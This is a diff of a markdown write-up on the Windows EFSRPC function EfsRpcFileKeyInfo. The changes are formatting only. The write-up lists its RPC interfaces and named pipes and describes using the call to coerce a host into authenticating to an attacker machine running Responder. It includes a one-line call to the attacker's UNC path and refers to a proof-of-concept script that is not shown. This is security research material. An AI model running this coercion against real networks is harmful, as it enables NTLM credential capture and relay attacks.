@@ -9,20 +9,19 @@
 + **Function operation number**: `12`
 
 + **RPC Interfaces**:
-   + Interface 1:
-     - uuid=`c681d488-d850-11d0-8c52-00c04fd90f7e`
-     - version=`1.0`
-     - Accessible through:
-       + SMB named pipe: `\PIPE\lsarpc`
-       + SMB named pipe: `\PIPE\lsass`
-       + SMB named pipe: `\PIPE\netlogon`
-       + SMB named pipe: `\PIPE\samr`
-   + Interface 2:
-     - uuid=`df1941c5-fe89-4e79-bf10-463657acf44d`
-     - version=`1.0`
-     - Accessible through:
-       + SMB named pipe: `\PIPE\efsrpc`
-
+  + Interface 1:
+    + uuid=`c681d488-d850-11d0-8c52-00c04fd90f7e`
+    + version=`1.0`
+    + Accessible through:
+      + SMB named pipe: `\PIPE\lsarpc`
+      + SMB named pipe: `\PIPE\lsass`
+      + SMB named pipe: `\PIPE\netlogon`
+      + SMB named pipe: `\PIPE\samr`
+  + Interface 2:
+    + uuid=`df1941c5-fe89-4e79-bf10-463657acf44d`
+    + version=`1.0`
+    + Accessible through:
+      + SMB named pipe: `\PIPE\efsrpc`
 
 ## Description
 
@@ -33,7 +32,6 @@ The IP 192.168.2.51 being my attacking machine where I listen with Responder, an
 ```cpp
 EfsRpcFileKeyInfo("\\\\192.168.2.51\\share\\file.txt\x00", 0)
 ```
-
 
 We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
 
@@ -64,9 +62,7 @@ DWORD EfsRpcFileKeyInfo(
 
 + **binding_h**: This is an RPC binding handle parameter, as specified in [C706] and [MS-RPCE] section 2.
 
-
 + **FileName**: An EFSRPC identifier, as specified in section 2.2.1.
-
 
 + **InfoClass**: One of the values in the following table. With the exception of UPDATE_KEY_USED (0x00000100), a server SHOULD support all of these values. A server MAY choose to support UPDATE_KEY_USED.<45>
 
@@ -78,12 +74,10 @@ DWORD EfsRpcFileKeyInfo(
 | `CHECK_DECRYPTION_STATUS` | `0x00000200` | Request a hint from the server as to whether the given object could be successfully decrypted without further user intervention or higher-level events. The server will return this information in an `EFS_DECRYPTION_STATUS_INFO` structure in the `KeyInfo` parameter. |
 | `CHECK_ENCRYPTION_STATUS` | `0x00000400` | Request a hint from the server as to whether the given object could be successfully encrypted without further user intervention or higher-level events. The server will return this information in an `EFS_ENCRYPTION_STATUS_INFO` structure in the `KeyInfo` parameter. |
 
-
 + **KeyInfo**: Returned by the server, as previously specified.
 
 ## References
 
-+ Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31
++ Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
 
-
-+ Documentation of function `EfsRpcFileKeyInfo`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c
++ Documentation of function `EfsRpcFileKeyInfo`: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c)
